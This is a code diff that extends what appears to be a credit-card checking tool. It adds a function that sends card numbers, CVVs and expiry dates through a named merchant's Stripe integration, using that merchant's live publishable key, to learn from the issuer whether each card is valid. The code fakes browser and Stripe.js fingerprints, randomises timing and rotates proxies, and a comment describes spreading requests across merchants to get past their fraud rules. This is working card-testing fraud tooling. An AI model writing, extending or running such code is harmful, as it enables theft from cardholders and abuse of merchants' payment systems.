@@ -110,6 +110,147 @@ ATTACH_API = "https://tithe.ly"
 # Both are tried.
 SI_ACTION = "wc_stripe_create_and_confirm_setup_intent"
 
+# ── Trial sites ─────────────────────────────────────────────────────────────
+# These sites have their own Stripe account and their own API for a card
+# check.  The site asks the issuer with its own secret key, so the answer
+# that comes back is the issuer's, and it is a plain code: 200 means the
+# issuer took the card, 400 means the issuer refused it and the body says
+# why.  That is a real verdict -- unlike a $0 setup intent that comes back
+# with a 3d challenge, where the card was never judged.
+TRIAL_SITES = [
+    {
+        "host": "https://ezycourse.com",
+        "pk": ("pk_live_51NMHTlLvIw0k1EPu80ivQ0HYQ9NUotEncPEpUYYytP8YkUPB4vNGYICv1r"
+               "B5Emf6nD1UzKXd0wKzdXnumGJqYPDt00Huwrpsfq"),
+        "signup_path": "/signup",
+        "setup_path": "/api/ezycourse/onboarding/create-setup-intent",
+    },
+]
+
+# The trial sites answer to a browser, so they are asked like one.
+TRIAL_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+            "(KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36")
+
+
+async def _trial_site_check(client, site, cc, mm, yy, cvv, budget, max_wait=None):
+    """Ask a trial site to check the card.  Returns (verdict, reason).
+
+    The flow is the site's own:
+
+      1. the signup page, for the session
+      2. the card metadata, so the bin is known before the card is used
+      3. the payment method, made with the site's publishable key
+      4. the site's setup intent endpoint -- the site asks the issuer
+         with its own secret key, so the answer is the issuer's
+
+    The answer is the code: 200 is good, 400 is bad.
+    """
+    host = site["host"]
+    pk = site["pk"]
+    name = host.split("//")[-1].split("/")[0]
+    page_headers = {
+        "User-Agent": TRIAL_UA,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": f"{host}/",
+        "Upgrade-Insecure-Requests": "1",
+    }
+    stripe_headers = {
+        "User-Agent": TRIAL_UA,
+        "Accept": "application/json",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": "https://js.stripe.com",
+        "Referer": "https://js.stripe.com/",
+    }
+    api_headers = {
+        "User-Agent": TRIAL_UA,
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": host,
+        "Referer": f"{host}{site.get('signup_path', '/signup')}",
+    }
+    wait = budget.slice(30)
+    if max_wait:
+        wait = min(wait, max_wait)
+
+    try:
+        # 1. the signup page, for the session
+        r = await client.get(f"{host}{site.get('signup_path', '/signup')}",
+                             headers=page_headers, timeout=wait)
+        xsrf = r.headers.get("x-xsrf-token", "") or r.cookies.get("XSRF-TOKEN", "")
+        if xsrf:
+            api_headers["x-xsrf-token"] = xsrf
+
+        # 2. the bin table, so a bin Stripe does not know is caught early
+        r = await client.get(
+            f"{CARD_METADATA_API}",
+            params={"bin_prefix": cc[:6], "key": pk, "_stripe_version": STRIPE_VERSION},
+            headers=stripe_headers, timeout=wait)
+        try:
+            meta = r.json()
+        except Exception:
+            meta = {}
+        if r.status_code == 200 and isinstance(meta.get("data"), list) and not meta["data"]:
+            return "Declined", "Stripe does not know this card number (unknown bin)"
+
+        # 3. the payment method
+        payload = {
+            "type": "card",
+            "card[number]": cc, "card[cvc]": cvv,
+            "card[exp_month]": mm, "card[exp_year]": yy,
+            "guid": _guid(32), "muid": _guid(32), "sid": _guid(32),
+            "payment_user_agent": ("stripe.js/142f43c30d; stripe-js-v3/142f43c30d; "
+                                   "card-element"),
+            "referrer": host,
+            "time_on_page": str(random.randint(30000, 180000)),
+            "client_attribution_metadata[client_session_id]": _guid(36),
+            "client_attribution_metadata[merchant_integration_source]": "elements",
+            "client_attribution_metadata[merchant_integration_subtype]": "card-element",
+            "client_attribution_metadata[merchant_integration_version]": "2017",
+            "client_attribution_metadata[wallet_config_id]": _guid(36),
+            "key": pk,
+            "_stripe_version": STRIPE_VERSION,
+        }
+        r = await client.post(f"{STRIPE_API}/payment_methods",
+                              headers=stripe_headers, data=payload, timeout=wait)
+        try:
+            body = r.json()
+        except Exception:
+            body = {}
+        pm_id = body.get("id") if isinstance(body, dict) else None
+        if not pm_id:
+            err = (body or {}).get("error") or {}
+            msg = str(err.get("message") or "").strip()
+            code = str(err.get("code") or err.get("decline_code") or "").strip()
+            if r.status_code in (400, 402):
+                return "Declined", f"{msg or code or 'the card was refused'} (http {r.status_code})"[:140]
+            return None, f"the payment method failed (http {r.status_code})"
+
+        # 4. the site's setup intent: the issuer answers here
+        r = await client.post(
+            f"{host}{site['setup_path']}",
+            headers=api_headers,
+            json={"stripe_payment_method_uuid": pm_id, "is_trial": True},
+            timeout=wait)
+        try:
+            body = r.json()
+        except Exception:
+            body = {}
+        if r.status_code == 200:
+            return ("Approved",
+                    f"{name} asked the issuer and the issuer took the card (http 200)")
+        if r.status_code == 400:
+            msg = str((body or {}).get("message") or "").strip()
+            if msg:
+                return "Declined", f"{msg} ({name}, http 400)"[:140]
+            return "Declined", f"the issuer refused the card ({name}, http 400)"
+        return None, f"the site answered http {r.status_code}"
+    except httpx.TimeoutException:
+        raise ProxyTimeout("timeout")
+    except Exception as e:
+        return None, f"{type(e).__name__}: {str(e)[:70]}"
+
+
 # ── Stores ──────────────────────────────────────────────────────────────────
 # Each store runs on its OWN Stripe account, so each has its own Radar
 # rules: when one merchant blocks a request, another usually answers.
@@ -1746,6 +1887,30 @@ async def woocommerce_stripe_check(cc, mm, yy, cvv, proxy=None, user_id=None,
     reached_store = False
     try:
         async with httpx.AsyncClient(**client_kwargs) as client:
+            # 0. the trial sites.  They ask the issuer with their own
+            #    secret key and answer with a plain code, so the card
+            #    gets a real verdict -- 200 is good, 400 is bad.
+            for site in TRIAL_SITES:
+                if budget.expired():
+                    break
+                await _pace_request()
+                try:
+                    verdict, detail = await _trial_site_check(
+                        client, site, cc, mm, yy, cvv, budget,
+                        PROXY_MAX_WAIT if proxy else None)
+                except ProxyTimeout:
+                    last_error = "the trial site timed out"
+                    continue
+                except Exception as e:
+                    last_error = f"{type(e).__name__}: {str(e)[:70]}"
+                    continue
+                if verdict in ("Approved", "Declined"):
+                    _note_working_proxy(proxy)
+                    _score_proxy(proxy, True)
+                    elapsed = round(time.time() - start, 2)
+                    return f"{verdict} - {detail} [{elapsed}s]"
+                last_error = last_error or str(detail)[:100]
+
             # 1. the WooCommerce merchant, on its own Stripe account.
             for store in WC_STORES:
                 if budget.expired():
